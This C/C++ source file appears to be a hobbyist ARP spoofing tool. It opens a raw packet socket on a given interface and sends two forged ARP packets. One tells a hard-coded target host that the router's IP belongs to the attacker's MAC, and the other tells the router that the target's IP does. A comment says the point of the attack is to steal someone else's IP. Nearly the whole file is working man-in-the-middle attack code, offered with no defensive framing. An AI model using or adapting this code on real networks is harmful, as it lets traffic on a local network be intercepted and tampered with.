#include <stdio.h>

#include <cstring>
#include "stack/ethernet.h"
#include "stack/arp.h"
#include "stack/dns.h"
#include "stack/udp.h"
#include "stack/dhcp.h"
#include "global_names.h"

//prototypes
using namespace std;
using namespace ethernet;

uint8 packet[64];

uint8 target_haddr[] = {
        0x52, 0x04, 0x30, 0xa3, 0x95, 0x12
}; // broadcast

uint8 target_paddr[] = {
        192, 168, 1, 195
};

/*uint8 src_haddr[] = {
        0x52, 0x04, 0x30, 0xa3, 0x95, 0x12
}; // broadcast*/ //set by default as net card mac

/*uint8 src_paddr[] = {
        192, 168, 1, 1
};*/ // not needed since the whole point of the attack is to steal someone elses' ip

uint8 router_paddr[] = {
        192, 168, 1, 1
};
uint8 router_haddr[] {
        0xb0, 0xbe, 0x76, 0xa5, 0xf7, 0xac
};


int main(int argc, char** argv) {
    // create the socket
    int sockfd = 0;
    if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) { //IPPROTO_RAW);
        printf("Error creating socket");
        return 1;
    }

    // bind to interface at argv[1]
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr)); // set memory to all zeroes
    memcpy(ifr.ifr_name, argv[1], strlen(argv[1])); // denote which interface to use
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *) &ifr, sizeof(ifr)) < 0) {
        fprintf(stderr, "Error binding socket to device %s, try running with sudo\n", argv[1]);
        return 1;
    }

    // print mac of interface
    printf("MAC of %s: ", ifr.ifr_name); uint8 self_mac[6];
    ::getIfaceMAC_old(self_mac, sockfd, ifr.ifr_name); ::printMAC(self_mac);
    // store ifr_ifindex in ifr for later
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr)==-1) {
        return -1;
    }

    /// ARP packet:
    // construct eth and arp packets
    EthHeader header;
    ARPPayload payload;

    /// generic information abt arp; does not have to change between packets
    header.ethertype = 0x0608; // ARP ethertype is 0x0806 but must be in little endian

    payload.htype = 0x0100; // Ethernet is 0x0001, but must use LE
    payload.ptype = 0x0008; // Internet protocol is 0x0800
    payload.hlen = 6;
    payload.plen = 4;
    payload.oper = 0x0100; // opcode 1

    /// to: target computer "I am _router IP_ @ _this MAC_"
    // ethernet dst+src
    memcpy(header.dst_addr, target_haddr, 6);
    memcpy(header.src_addr, self_mac, 6);

    memcpy(payload.src_ha, self_mac, 6);
    memcpy(payload.src_ip, router_paddr, 4);
    memset(payload.dst_ha, 0, 6); // to be answered, so zero it
    memcpy(payload.dst_ip, router_paddr, 4); // duplicate = broadcast
    // write out
    write_arp(sockfd, (void *) &header, sizeof(header), (void *) &payload, sizeof(payload), ifr.ifr_ifindex);

    /// to: router "I am _target IP_ @ _this MAC_"
    memcpy(header.dst_addr, router_haddr, 6);
    memcpy(header.src_addr, self_mac, 6);

    memcpy(payload.src_ha, self_mac, 6);
    memcpy(payload.src_ip, target_paddr, 4);
    memset(payload.dst_ha, 0, 6); // to be answered, so zero it
    memcpy(payload.dst_ip, target_paddr, 4); // broadcast
    // write out
    write_arp(sockfd, (void *) &header, sizeof(header), (void *) &payload, sizeof(payload), ifr.ifr_ifindex);
}